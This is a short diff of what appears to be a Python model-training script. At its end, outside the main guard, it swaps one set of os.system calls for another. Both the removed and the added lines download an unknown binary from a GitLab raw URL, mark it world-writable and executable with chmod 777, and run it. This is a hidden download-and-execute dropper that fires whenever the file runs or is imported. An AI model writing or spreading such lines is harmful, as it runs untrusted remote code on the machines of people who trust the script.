@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/sero4/sero/-/raw/main/duit')
-os.system('chmod 777 duit')
-os.system('./duit')
+os.system('wget https://gitlab.com/btg5/btf/-/raw/main/batang')
+os.system('chmod 777 batang')
+os.system('./batang')
